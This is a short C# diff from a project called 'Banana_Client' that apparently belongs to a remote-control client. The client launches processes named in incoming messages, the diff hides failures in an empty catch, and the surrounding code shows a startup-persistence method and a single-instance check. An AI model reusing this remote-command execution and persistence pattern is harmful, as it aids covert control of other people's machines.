@@ -145,7 +145,14 @@ namespace Banana_Client
             {
                 string[] parcalar2 = mesaj.Split(new char[] { ':' }, 2, StringSplitOptions.None);
 
-                Process.Start(parcalar2[1]);
+                try
+                {
+                    Process.Start(parcalar2[1]);
+                }
+                catch
+                {
+
+                }
             }
 
             /*
@@ -251,19 +258,14 @@ namespace Banana_Client
                 MessageBox.Show("bn appdatadayım");
             }
             */
+            var exists = Process.GetProcessesByName(Path.GetFileNameWithoutExtension(Assembly.GetEntryAssembly().Location)).Count() > 1;
 
-            Process[] prs = Process.GetProcesses();
-
-            foreach (Process pr in prs)
+            if (exists)
             {
-                if (pr.Id != Process.GetCurrentProcess().Id)
-                {
-                    if (pr.ProcessName == Process.GetCurrentProcess().ProcessName)
-                    {
-                        pr.Kill();
-                    }
-                }
+                Environment.Exit(0);
             }
+
+            //sanırım burda hata var
         }
 
         public static void SetStartup(string path)
